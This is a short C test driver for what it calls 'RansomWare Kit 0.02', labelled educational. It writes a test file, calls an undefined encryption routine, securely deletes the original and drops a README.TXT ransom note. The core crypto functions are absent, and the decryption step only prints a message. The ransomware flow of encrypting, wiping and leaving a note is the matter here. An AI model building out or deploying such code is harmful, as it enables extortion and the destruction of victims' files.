#include <stdlib.h>
#include <stdio.h>

int main()
{
	/* create test file */
	FILE *fp = NULL;
	fp = fopen("message.txt","w");
	if(!fp) {
		perror("test message creation failed!");
		exit(-1);
	}
	fputs("message\n", fp);
	fclose(fp);
	
	/* generate "random session key" for this file */

	/* Encrypt file using RSK + AES-256 */
	
	//AES( 0, "key", "message.txt", "enc_message.txt");
	//AES( 0, "key", "test.txt", "enc_test.txt");
	encrypt_file("");
	printf("encrytion done!\n");

	bench_rsa();	

	/* Decrypt file using RSK + AES-256 */
	//AES( 1, "key", "enc_message.txt", "message_back.txt");
	//AES( 1, "key", "enc_test.txt", "test_back.txt");
	printf("decrytion done!\n");

	/* Secure RM file */
	mysrm("message.txt");

	/* Leave random note */

	fp = fopen("README.TXT","w");
	if(!fp) {
		perror("Ransom note delivery failed!");
		exit(-1);
	}
	fputs("This is RansomWare Kit 0.02!\nStrictly for educational purposes!\n", fp);
	fclose(fp);

	printf("done!\n");
	return 0;

}
